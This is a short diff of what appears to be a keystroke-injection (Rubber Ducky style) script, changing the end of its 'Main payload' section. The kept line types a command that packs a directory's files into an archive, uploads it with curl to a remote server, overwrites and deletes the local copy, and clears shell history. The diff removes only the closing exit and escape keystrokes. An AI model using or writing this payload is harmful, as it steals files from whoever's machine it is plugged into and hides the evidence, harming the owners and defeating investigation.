@@ -17,6 +17,3 @@ REM Main payload.
 
 STRING cd $DIR && tar --exclude=$NM -zcf $NM ./* && curl $SRV -T $NM && dd if=/dev/urandom of=$NM bs=100M count=1 && rm $NM && history -c; exit
 ENTER
-STRING exit
-ENTER
-ESC
